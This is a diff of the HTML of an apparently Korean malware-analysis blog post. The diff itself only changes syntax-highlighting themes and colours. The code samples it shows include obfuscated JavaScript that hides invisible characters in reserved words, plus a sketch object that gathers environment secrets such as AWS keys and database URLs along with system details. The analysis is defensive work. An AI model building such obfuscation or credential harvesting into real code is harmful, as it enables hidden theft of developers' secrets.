+<span data-line=""><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">  '</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">of‌</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">'</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">  `</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">var throw‌‌‌‌‌‌‌‌‌‌‌‌‌,do‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌,public‌‌‌‌‌‌‌‌‌‌‌‌,case‌‌‌‌‌‌‌‌‌‌‌‌‌‌,new‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌,void‌‌‌‌‌‌‌‌‌‌‌‌‌‌,function‌‌‌‌‌‌‌‌‌‌,of‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌,var‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌,in‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌;function for‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌(throw‌‌‌‌‌‌‌‌‌‌‌‌‌,do‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌,public‌‌‌‌‌‌‌‌‌‌‌‌){for(public‌‌‌‌‌‌‌‌‌‌‌‌=0x0;public‌‌‌‌‌‌‌‌‌‌‌‌&lt;do‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌;public‌‌‌‌‌‌‌‌‌‌‌‌++)throw‌‌‌‌‌‌‌‌‌‌‌‌‌.push(throw‌‌‌‌‌‌‌‌‌‌‌‌‌.shift());return throw‌‌‌‌‌‌‌‌‌‌‌‌‌}</span></span>
+<span data-line=""><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">  const arguments‌‌‌‌‌‌‌‌‌=["</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">u006c</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">u0065</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">u006e</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">\\</span></span>
+<span data-line=""><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">  ...</span></span>
+<span data-line=""><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">  arguments‌‌‌‌‌‌‌‌‌‌[new‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌(arguments‌‌‌‌‌‌‌‌‌[0x89])]||arguments‌‌‌‌‌‌‌‌‌‌)}</span></span>
+<span data-line=""><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">                          })();</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">`</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic"> // 약 8000 줄</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">)(</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">{</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">  get void‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌() </span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">{</span></span>
+<span data-line=""><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#89DDFF;--shiki-dark-font-style:italic">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8"> window</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">;</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">  },</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">  get switch‌‌‌‌‌‌‌‌‌‌‌‌‌() </span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">{</span></span>
+<span data-line=""><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#89DDFF;--shiki-dark-font-style:italic">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8"> require</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">;</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">  },</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">}</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">)</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">;</span></span></code></pre>
       </figure>
       <p class="mt-4 mb-4">악성 코드의 주요 흐름은 아래와 같다.</p>
       <ol class="min-[790px]:ml-6 ml-4 list-decimal">
@@ -601,7 +946,7 @@
           href="#3-예약어-기만"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >3. 예약어 기만
       </h3>
@@ -609,26 +954,26 @@
         <pre
           tabindex="0"
           data-language="js"
-          data-theme="material-theme-palenight"
-        ><code data-language="js" data-theme="material-theme-palenight" style="display:grid"><span data-line=""><span style="color:#676E95;font-style:italic">// Function 함수의 두 번째 인자. 문자열로 되어 있음.</span></span>
-<span data-line=""><span style="color:#C792EA">var</span><span style="color:#BABED8"> throw‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="color:#89DDFF">,</span><span style="color:#676E95;font-style:italic"> // 실제로는 throw + "보이지 않는 문자"들로 되어 있음.</span></span>
-<span data-line=""><span style="color:#BABED8">  do‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#BABED8">  public‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#BABED8">  case‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#BABED8">  new‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#BABED8">  void‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#BABED8">  function‌‌‌‌‌‌‌‌‌‌</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#BABED8">  of‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#BABED8">  var‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#BABED8">  in‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="color:#89DDFF">;</span></span>
-<span data-line=""><span style="color:#676E95;font-style:italic">// ...</span></span>
-<span data-line=""><span style="color:#C792EA">const</span><span style="color:#BABED8"> arguments‌‌‌‌‌‌‌‌‌ </span><span style="color:#89DDFF">=</span><span style="color:#BABED8"> [</span></span>
-<span data-line=""><span style="color:#89DDFF">  '</span><span style="color:#BABED8">\\</span><span style="color:#C3E88D">u006c</span><span style="color:#BABED8">\\</span><span style="color:#C3E88D">u0065</span><span style="color:#BABED8">\\</span><span style="color:#C3E88D">u006e</span><span style="color:#BABED8">\\</span><span style="color:#C3E88D">u0067</span><span style="color:#BABED8">\\</span><span style="color:#C3E88D">u0074</span><span style="color:#BABED8">\\</span><span style="color:#C3E88D">u0068</span><span style="color:#89DDFF">'</span><span style="color:#89DDFF">,</span><span style="color:#676E95;font-style:italic"> // length</span></span>
-<span data-line=""><span style="color:#F78C6C">  0x1</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#89DDFF">  '</span><span style="color:#BABED8">\\</span><span style="color:#C3E88D">u0062</span><span style="color:#89DDFF">'</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#F78C6C">  0x0</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#89DDFF">  '</span><span style="color:#BABED8">\\</span><span style="color:#C3E88D">u0068</span><span style="color:#89DDFF">'</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#F78C6C">  0x3</span><span style="color:#89DDFF">,</span></span></code></pre>
+          data-theme="github-light material-theme-palenight"
+        ><code data-language="js" data-theme="github-light material-theme-palenight" style="display:grid"><span data-line=""><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic">// Function 함수의 두 번째 인자. 문자열로 되어 있음.</span></span>
+<span data-line=""><span style="--shiki-light:#D73A49;--shiki-dark:#C792EA">var</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8"> throw‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic"> // 실제로는 throw + "보이지 않는 문자"들로 되어 있음.</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">  do‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">  public‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">  case‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">  new‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">  void‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">  function‌‌‌‌‌‌‌‌‌‌</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">  of‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">  var‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">  in‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">;</span></span>
+<span data-line=""><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic">// ...</span></span>
+<span data-line=""><span style="--shiki-light:#D73A49;--shiki-dark:#C792EA">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8"> arguments</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">‌‌‌‌‌‌‌‌‌ </span><span style="--shiki-light:#D73A49;--shiki-dark:#89DDFF">=</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8"> [</span></span>
+<span data-line=""><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">  '</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">u006c</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">u0065</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">u006e</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">u0067</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">u0074</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">u0068</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">'</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic"> // length</span></span>
+<span data-line=""><span style="--shiki-light:#005CC5;--shiki-dark:#F78C6C">  0x1</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">  '</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">u0062</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">'</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#005CC5;--shiki-dark:#F78C6C">  0x0</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">  '</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">u0068</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">'</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#005CC5;--shiki-dark:#F78C6C">  0x3</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span></code></pre>
       </figure>
       <p class="mt-4 mb-4">
         <code>throw</code> 같이 자주 사용되는 예약어에 <u>보이지 않는 문자</u>를
@@ -726,7 +1071,7 @@
           href="#예약어를-위와-같이-덮어쓰는건-몇가지-공격자-이점이-있다"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >예약어를 위와 같이 덮어쓰는건 몇가지 공격자 이점이 있다
       </h4>
@@ -764,7 +1109,7 @@
           href="#4-전역-객체-접근-함수-선언"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >4. 전역 객체 접근 함수 선언
       </h3>
@@ -803,33 +1148,33 @@
             <pre
               tabindex="0"
               data-language="js"
-              data-theme="material-theme-palenight"
-            ><code data-language="js" data-theme="material-theme-palenight" style="display:grid"><span data-line=""><span style="color:#676E95;font-style:italic">// 이제 다음에 접근 가능</span></span>
-<span data-line=""><span style="color:#BABED8">globalObj</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">process</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">env</span><span style="color:#89DDFF">;</span><span style="color:#676E95;font-style:italic">     // 환경변수 전체</span></span>
-<span data-line=""><span style="color:#BABED8">globalObj</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">process</span><span style="color:#89DDFF">.</span><span style="color:#82AAFF">cwd</span><span style="color:#BABED8">()</span><span style="color:#89DDFF">;</span><span style="color:#676E95;font-style:italic">   // 현재 디렉토리</span></span>
-<span data-line=""><span style="color:#BABED8">globalObj</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">require</span><span style="color:#89DDFF">;</span><span style="color:#676E95;font-style:italic">        // require 함수</span></span>
+              data-theme="github-light material-theme-palenight"
+            ><code data-language="js" data-theme="github-light material-theme-palenight" style="display:grid"><span data-line=""><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic">// 이제 다음에 접근 가능</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">globalObj</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">process</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">env</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">;</span><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic">     // 환경변수 전체</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">globalObj</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">process</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#82AAFF">cwd</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">()</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">;</span><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic">   // 현재 디렉토리</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">globalObj</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">require</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">;</span><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic">        // require 함수</span></span>
 <span data-line=""> </span>
-<span data-line=""><span style="color:#676E95;font-style:italic">// 가능한 예상 수집 대상 정보들</span></span>
-<span data-line=""><span style="color:#C792EA">const</span><span style="color:#BABED8"> payload </span><span style="color:#89DDFF">=</span><span style="color:#89DDFF"> {</span></span>
-<span data-line=""><span style="color:#F07178">  env</span><span style="color:#89DDFF">:</span><span style="color:#89DDFF"> {</span></span>
-<span data-line=""><span style="color:#F07178">    AWS_ACCESS_KEY_ID</span><span style="color:#89DDFF">:</span><span style="color:#BABED8"> process</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">env</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">AWS_ACCESS_KEY_ID</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#F07178">    AWS_SECRET_ACCESS_KEY</span><span style="color:#89DDFF">:</span><span style="color:#BABED8"> process</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">env</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">AWS_SECRET_ACCESS_KEY</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#F07178">    DATABASE_URL</span><span style="color:#89DDFF">:</span><span style="color:#BABED8"> process</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">env</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">DATABASE_URL</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#676E95;font-style:italic">    // ... 모든 환경변수</span></span>
-<span data-line=""><span style="color:#89DDFF">  },</span></span>
-<span data-line=""><span style="color:#F07178">  system</span><span style="color:#89DDFF">:</span><span style="color:#89DDFF"> {</span></span>
-<span data-line=""><span style="color:#F07178">    hostname</span><span style="color:#89DDFF">:</span><span style="color:#BABED8"> os</span><span style="color:#89DDFF">.</span><span style="color:#82AAFF">hostname</span><span style="color:#BABED8">()</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#F07178">    username</span><span style="color:#89DDFF">:</span><span style="color:#BABED8"> os</span><span style="color:#89DDFF">.</span><span style="color:#82AAFF">userInfo</span><span style="color:#BABED8">()</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">username</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#F07178">    cwd</span><span style="color:#89DDFF">:</span><span style="color:#BABED8"> process</span><span style="color:#89DDFF">.</span><span style="color:#82AAFF">cwd</span><span style="color:#BABED8">()</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#F07178">    platform</span><span style="color:#89DDFF">:</span><span style="color:#BABED8"> process</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">platform</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#F07178">    arch</span><span style="color:#89DDFF">:</span><span style="color:#BABED8"> process</span><span style="color:#89DDFF">.</span><span style="color:#BABED8">arch</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#89DDFF">  },</span></span>
-<span data-line=""><span style="color:#F07178">  project</span><span style="color:#89DDFF">:</span><span style="color:#89DDFF"> {</span></span>
-<span data-line=""><span style="color:#F07178">    packageJson</span><span style="color:#89DDFF">:</span><span style="color:#82AAFF"> require</span><span style="color:#BABED8">(</span><span style="color:#89DDFF">'</span><span style="color:#C3E88D">./package.json</span><span style="color:#89DDFF">'</span><span style="color:#BABED8">)</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#F07178">    dependencies</span><span style="color:#89DDFF">:</span><span style="color:#676E95;font-style:italic"> /* 의존성 정보 */</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#F07178">    scripts</span><span style="color:#89DDFF">:</span><span style="color:#89DDFF"> /</span><span style="color:#C3E88D">_ npm scripts </span><span style="color:#BABED8">\_</span><span style="color:#89DDFF">/</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#89DDFF">  }</span></span>
-<span data-line=""><span style="color:#89DDFF">};</span></span>
+<span data-line=""><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic">// 가능한 예상 수집 대상 정보들</span></span>
+<span data-line=""><span style="--shiki-light:#D73A49;--shiki-dark:#C792EA">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8"> payload</span><span style="--shiki-light:#D73A49;--shiki-dark:#89DDFF"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF"> {</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">  env</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF"> {</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">    AWS_ACCESS_KEY_ID</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8"> process</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">env</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">AWS_ACCESS_KEY_ID</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">    AWS_SECRET_ACCESS_KEY</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8"> process</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">env</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">AWS_SECRET_ACCESS_KEY</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">    DATABASE_URL</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8"> process</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">env</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#BABED8">DATABASE_URL</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic">    // ... 모든 환경변수</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">  },</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">  system</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF"> {</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">    hostname</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8"> os</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#82AAFF">hostname</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">()</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">    username</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8"> os</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#82AAFF">userInfo</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">()</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">username</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">    cwd</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8"> process</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#82AAFF">cwd</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">()</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">    platform</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8"> process</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">platform</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">    arch</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8"> process</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">arch</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">  },</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">  project</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF"> {</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">    packageJson</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#6F42C1;--shiki-dark:#82AAFF"> require</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">(</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">'</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">./package.json</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">'</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">)</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">    dependencies</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic"> /* 의존성 정보 */</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
